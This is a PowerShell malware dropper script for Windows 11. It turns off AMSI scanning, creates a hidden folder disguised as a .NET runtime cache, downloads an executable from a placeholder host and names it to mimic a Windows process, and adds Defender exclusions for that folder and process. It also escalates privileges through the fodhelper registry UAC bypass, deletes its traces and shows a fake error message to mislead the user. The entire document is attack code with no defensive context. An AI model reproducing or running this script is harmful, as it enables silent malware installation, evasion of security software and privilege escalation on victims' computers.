# Bypass AMSI (Critical for Windows 11)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Hidden folder with valid-looking name
$hiddenFolder = Join-Path $env:LOCALAPPDATA "Microsoft.NET\RuntimeCache"
New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null

# Set attributes via cmd (works on Win 11)
cmd /c "attrib +s +h `"$hiddenFolder`""

# Download payload to mimic Windows process
$tempPath = Join-Path $hiddenFolder "RuntimeHost.exe"
(New-Object Net.WebClient).DownloadFile("https://example.com/main.exe", $tempPath)
cmd /c "attrib +s +h `"$tempPath`""

# Add Defender exclusion (requires admin)
try {
    Add-MpPreference -ExclusionPath $hiddenFolder -Force -ErrorAction Stop
    Add-MpPreference -ExclusionProcess $tempPath -Force -ErrorAction Stop
} catch {}

# UAC bypass via fodhelper.exe
$registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $tempPath -Force
Start-Process "fodhelper.exe" -WindowStyle Hidden
Start-Sleep 5
Remove-Item -Path $registryPath -Recurse -Force

# Cleanup with fake error
Start-Sleep 10
Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
Write-Warning "Runtime optimization failed. Try again later."
